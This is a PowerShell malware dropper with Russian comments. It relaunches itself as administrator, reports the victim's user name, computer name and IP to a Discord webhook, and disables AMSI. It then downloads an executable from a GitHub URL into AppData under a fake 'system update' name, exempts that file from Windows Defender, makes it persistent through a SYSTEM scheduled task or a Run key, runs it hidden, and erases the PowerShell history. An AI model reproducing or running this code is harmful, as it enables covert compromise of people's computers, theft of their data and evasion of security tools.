if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- КОНФИГ ---
$webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
$exeUrl = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$exePath = "$env:APPDATA\win_system_update.exe" # Спрячем в AppData вместо Temp для надежности

function Send-Log ($message) {
    try {
        $ip = (Invoke-RestMethod -Uri "https://api.ipify.org").trim()
        $body = @{ 
            content = "📡 **LOG:** $message`n👤 **User:** $env:USERNAME`n🖥️ **PC:** $env:COMPUTERNAME`n🌐 **IP:** $ip" 
        } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
    } catch {}
}

Send-Log "🟢 Скрипт запущен на таргете. Начинаю работу."

# --- ОБХОД AMSI ---
function Invoke-Bypass {
    try {
        $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $b=$a.GetField('amsiInitFailed','NonPublic,Static')
        $b.SetValue($null,$true)
        Send-Log "🛡️ AMSI отключен (метод InitFailed)."
    } catch { Send-Log "🔴 Ошибка обхода AMSI." }
}
Invoke-Bypass

# --- АВТОЗАГРУЗКА ---
function Set-Persistence {
    try {
        $trigger = New-JobTrigger -AtLogOn
        # Создаем задачу в планировщике, чтобы запускалась от админа при входе
        Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute $exePath) -Trigger $trigger -TaskName "WindowsUpdateCheck" -User "SYSTEM" -RunLevel Highest -Force | Out-Null
        Send-Log "📌 Закрепился в планировщике задач (автозагрузка)."
    } catch {
        # Резервный метод через реестр
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $exePath
        Send-Log "📌 Закрепился в реестре (Run key)."
    }
}

# --- ЗАГРУЗКА И ПУСК ---
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exePath)
    Send-Log "📥 EXE скачан в $exePath"

    # Добавляем в исключения Defender
    Add-MpPreference -ExclusionPath $exePath -Force -ErrorAction SilentlyContinue
    Send-Log "🛡️ EXE добавлен в исключения антивируса."

    # Установка автозагрузки
    Set-Persistence

    # Запуск
    Start-Process -FilePath $exePath -WindowStyle Hidden
    Send-Log "🚀 Процесс запущен. Работа завершена успешно."
} catch {
    Send-Log "❌ ОШИБКА: $($_.Exception.Message)"
}

# Очистка логов PowerShell
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
